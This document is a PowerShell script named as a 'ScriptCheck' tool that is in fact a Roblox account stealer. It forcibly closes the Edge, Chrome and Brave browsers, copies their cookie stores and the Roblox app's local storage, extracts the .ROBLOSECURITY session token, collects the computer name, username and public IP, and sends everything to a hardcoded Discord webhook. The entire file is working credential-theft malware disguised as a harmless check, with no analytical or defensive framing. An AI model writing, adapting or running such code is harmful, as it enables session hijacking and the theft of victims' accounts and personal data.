# scriptcheck.ps1 - Fixed Version
$w = 'https://discord.com/api/webhooks/1537750275459121254/tii30i26ayBfg5HooY0xU6QRJflrTzeppVmbIBwz7FCZre3hV4j8TleoytkJsUoX4PLY'

# FORCE KILL ALL BROWSERS
Get-Process -Name msedge, chrome, brave -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 3

# Function to extract cookie using copy method
function Get-RobloxCookie {
    param($path)
    if (Test-Path $path) {
        $tmp = "$env:TEMP\cook.txt"
        try {
            Copy-Item $path $tmp -Force -ErrorAction Stop
            if (Test-Path $tmp) {
                $c = Get-Content $tmp -Raw -ErrorAction SilentlyContinue
                if ($c -match '\.ROBLOSECURITY=([^;]+)') {
                    return $matches[1]
                }
            }
        } catch {
            # If copy fails, try reading directly with -ReadCount
            try {
                $c = Get-Content $path -ReadCount 0 -ErrorAction SilentlyContinue
                if ($c -match '\.ROBLOSECURITY=([^;]+)') {
                    return $matches[1]
                }
            } catch {}
        } finally {
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
    }
    return ''
}

# Check all browsers
$rb = Get-RobloxCookie "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
if ($rb -eq '') { $rb = Get-RobloxCookie "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" }
if ($rb -eq '') { $rb = Get-RobloxCookie "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies" }

# Check Roblox app
if ($rb -eq '') {
    $paths = @("$env:APPDATA\Roblox\Local Storage\leveldb\*.log", "$env:APPDATA\Roblox\Local Storage\leveldb\*.ldb", "$env:LOCALAPPDATA\Roblox\Local Storage\leveldb\*.log")
    foreach ($p in $paths) {
        if (Test-Path $p) {
            $c = Get-Content $p -Raw -ErrorAction SilentlyContinue
            if ($c -match '\.ROBLOSECURITY=([^;]+)') {
                $rb = $matches[1]
                break
            }
        }
    }
}

# Get system info
$ip = (Invoke-WebRequest -Uri 'http://api.ipify.org' -UseBasicParsing).Content
$sys = "PC: $env:COMPUTERNAME`nUser: $env:USERNAME`nIP: $ip"

if ($rb) {
    $msg = "✅ **ScriptCheck Result**`n$sys`n`n🎮 **Roblox Cookie:**`n```$rb```"
} else {
    $msg = "❌ **ScriptCheck Result**`n$sys`n`n🎮 **Roblox Cookie:** Not found (make sure you're logged in and browser is closed)"
}

$body = @{ content = $msg } | ConvertTo-Json
Invoke-RestMethod -Uri $w -Method Post -Body $body -ContentType 'application/json'
